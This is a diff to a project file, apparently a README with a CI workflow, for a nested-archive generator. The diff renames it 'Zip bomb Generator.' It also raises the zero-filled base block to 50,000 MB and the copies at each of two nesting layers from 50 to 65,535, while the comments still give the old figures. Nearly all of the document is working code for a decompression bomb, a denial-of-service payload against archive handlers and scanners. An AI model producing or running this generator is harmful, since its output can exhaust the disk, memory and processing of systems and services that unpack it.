@@ -1,4 +1,4 @@
-# Multi-Layer Compressed Data Structure Generator
+# Zip bomb Generator
 
 An automated, cloud-based utility designed to compile multi-layer nested archives for testing filesystem resilience, archive handler thresholds, and storage boundary constraints. 
 
@@ -42,7 +42,7 @@ jobs:
     - name: Set Up Architecture
       run: |
         # 1. Create a safe, stable base block (10 GB)
-        dd if=/dev/zero of=base_block.txt bs=1M count=10000
+        dd if=/dev/zero of=base_block.txt bs=1M count=50000
         
         # 2. Compress the base block to create Layer 1
         zip -9 layer1.zip base_block.txt
@@ -50,7 +50,7 @@ jobs:
         
         # 3. Create Layer 2: A folder containing 50 identical copies
         mkdir layer2_folder
-        for i in {1..50}; do
+        for i in {1..65535}; do
           cp layer1.zip layer2_folder/part_$i.zip
         done
         zip -r -9 layer2.zip layer2_folder/
@@ -58,7 +58,7 @@ jobs:
         
         # 4. Create Layer 3: A master folder containing 50 copies of Layer 2
         mkdir layer3_master
-        for j in {1..50}; do
+        for j in {1..65535}; do
           cp layer2.zip layer3_master/bundle_$j.zip
         done
         zip -r -9 multi_layer_archive.zip layer3_master/
